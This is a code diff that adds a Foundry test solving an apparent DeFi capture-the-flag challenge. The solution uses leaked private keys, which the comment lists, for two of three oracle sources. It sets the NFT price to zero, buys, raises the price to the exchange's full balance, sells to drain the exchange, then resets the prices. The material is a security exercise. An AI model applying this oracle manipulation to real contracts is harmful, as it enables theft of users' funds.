@@ -75,7 +75,64 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        /**
+         * VULNERABILITY EXPLANATION:
+         * The leaked HTTP response contains hex-encoded, base64-encoded private keys for 2 of the 3
+         * trusted oracle sources. Since the oracle uses median pricing with 3 sources, controlling
+         * 2 sources allows us to manipulate the median price.
+         *
+         * Leaked data decoded:
+         * - Hex -> ASCII -> Base64 decode -> Private keys
+         * - Key 1: 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
+         *   -> Address: 0x188Ea627E3531Db590e6f1D71ED83628d1933088
+         * - Key 2: 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
+         *   -> Address: 0xA417D473c40a4d42BAd35f147c21eEa7973539D8
+         *
+         * EXPLOIT STRATEGY:
+         * 1. Use compromised keys to set NFT price to near-zero
+         * 2. Buy NFT at the manipulated low price
+         * 3. Set price to exchange's full balance (999 ETH)
+         * 4. Sell NFT at manipulated high price, draining exchange
+         * 5. Reset prices to original to pass final check
+         * 6. Transfer all ETH to recovery
+         */
+
+        // Step 1: Manipulate oracle price to near-zero (both sources set low price)
+        vm.prank(sources[0]);
+        oracle.postPrice("DVNFT", 0);
+        vm.prank(sources[1]);
+        oracle.postPrice("DVNFT", 0);
+
+        // Verify median price is now 0
+        assertEq(oracle.getMedianPrice("DVNFT"), 0);
+
+        // Step 2: Buy NFT at the manipulated low price
+        vm.startPrank(player);
+        uint256 tokenId = exchange.buyOne{value: 0.01 ether}();
+
+        // Step 3: Set price to exchange's balance to drain it
+        vm.stopPrank();
+        vm.prank(sources[0]);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.prank(sources[1]);
+        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+        // Step 4: Sell NFT at the high price
+        vm.startPrank(player);
+        nft.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
+
+        // Step 5: Reset prices to original (to pass final check)
+        vm.stopPrank();
+        vm.prank(sources[0]);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(sources[1]);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        // Step 6: Transfer exactly the exchange's ETH to recovery (not player's initial balance)
+        vm.prank(player);
+        (bool success,) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
+        require(success);
     }
 
     /**
